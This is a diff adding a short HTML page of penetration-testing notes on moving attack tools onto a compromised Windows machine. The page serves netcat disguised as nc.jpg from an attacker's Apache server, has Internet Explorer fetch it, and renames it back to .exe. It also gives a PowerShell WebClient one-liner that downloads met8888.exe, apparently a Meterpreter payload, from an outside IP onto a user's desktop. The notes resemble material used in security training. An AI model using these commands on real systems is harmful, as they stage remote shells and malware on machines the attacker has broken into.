@@ -1,0 +1,32 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>HTTP / Internet Explorer</title>
+</head><body>1. run the apche Server on your machine<br/>
+/etc/init.d/apache2 start<br/>
+<br/>
+2. Copy the file(s) to the web root:<br/>
+cp * /var/www/<br/>
+<br/>
+3. Gain remote shell<br/>
+<br/>
+4. go to Internet Explorer Directory<br/>
+cd Program Files\Internet Explorer<br/>
+<br/>
+5. run the Internet Explorer<br/>
+start iexplore.exe http://192.168.10.155/nc.jpg<br/>
+<br/>
+6. change extension back to .exe<br/>
+<br/>
+<br/>
+<br/>
+If you only have command line access (e.g. through a shell), downloading via HTTP is a little trickier as there's no built-in Windows equivalent to curl or wget. The best option is to use PowerShell's WebClient object:<br/>
+<br/>
+(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')<br/>
+You can call this from a normal Windows command prompt as well<br/>
+ie powershell -c "blah blah"<br/>
+<br/>
+Newer versions of powershell have an alias <br/>
+wget and curl<br/>
+which calls Invoke-WebRequest</body></html>
